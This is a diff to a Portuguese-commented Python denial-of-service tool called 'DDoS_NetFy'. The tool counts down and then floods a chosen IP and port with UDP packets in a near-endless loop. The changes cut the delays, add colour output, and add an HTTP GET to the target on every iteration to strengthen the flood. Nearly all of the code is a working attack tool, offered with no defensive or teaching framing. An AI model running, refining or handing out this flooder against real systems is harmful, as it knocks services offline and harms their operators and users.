@@ -16,6 +16,7 @@ from colorama import init, Fore, Style
 import pyfiglet
 import os
 import sys
+import requests
 
 # iniciar
 init()
@@ -24,7 +25,7 @@ init()
 try:
     # inicia o socket
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(3)
+    s.settimeout(2)
 
 # erro o socket
 except socket.error:
@@ -42,9 +43,8 @@ try:
       
     # cria uma função chamada logo e dentro da função imprimi o texto DDoS_NetFy bem grande
     def logo():
-        texto = "DDoS_NetFy"
-        nome = pyfiglet.figlet_format(texto)
-        print(nome)
+        lg = pyfiglet.figlet_format("DDoS_NetFy")
+        print(Fore.YELLOW+f"{lg}"+Style.RESET_ALL)
     
     # fecha a função logo
     logo()
@@ -60,27 +60,38 @@ try:
      # inicia o ataque quando a contagem acaba
     for i in reversed(range(0, 6)):
         print(Fore.YELLOW + f"iniciando ataque em {i}" + Style.RESET_ALL, end="\r")
-        time.sleep(2)
+        
+        time.sleep(1)
         continue
     
     # espera 2 segundos para começar o ataque
     print("\n", Fore.CYAN + "Ataque iniciado com sucesso" + Style.RESET_ALL)
     time.sleep(2)
     
-    # loop for de 1 até 10000000000000000
-    for i in range(1, 10000000000000000):
-        # tratamento de erros
-        try:
-            # envia a mensagen em bytes
-            msg_bytes = msg.encode('utf-8')
-            s.sendto(msg_bytes, (ip, port))
-            
-            # imprimi "pacotes udp enviados" e o tanto que ele foi enviada
-            print(Fore.GREEN + f"pacotes udp enviados: {i} ip/url: {ip} porta: {port}" + Style.RESET_ALL)
-
-        # fechando o try-except pegando o tipo de erro e imprimindo na tela "erro: (tipo do erro)"
-        except Exception as e:
-            print(Fore.BLUE + f"erro {e}" + Style.RESET_ALL)
+    # loop for de 1 até 10000000000
+    for i in range(1, 10000000000):
+            try:
+            	# envia a mensagen em bytes
+            	msg_bytes = msg.encode('utf-8')
+            	s.sendto(msg_bytes, (ip, port))
+            				
+            except socket.error as e:
+            	print(Fore.RED+f"ERRO SOCKET: {e}"+Style.RESET_ALL)
+            	exit()
+            	
+            try:
+            	# imprimi "pacotes udp enviados" e o tanto que ele foi enviada
+            	print(Fore.GREEN + f"pacotes udp enviados: {i} ip/url: {ip} porta: {port}" + Style.RESET_ALL)
+            	try:
+            		fload = requests.get(f"http://{ip}")
+            			
+            	except requests.exceptions.RequestException as e:
+            		print(Fore.RED+f"ERRO {e}"+Style.RESET_ALL)
+            		exit()
+            		
+            except Exception as e:
+            	print(Fore.BLUE + f"erro {e}" + Style.RESET_ALL)
+            	exit()
 
 # tratamento de erro pro erro KeyboardInterrupt
 except KeyboardInterrupt:
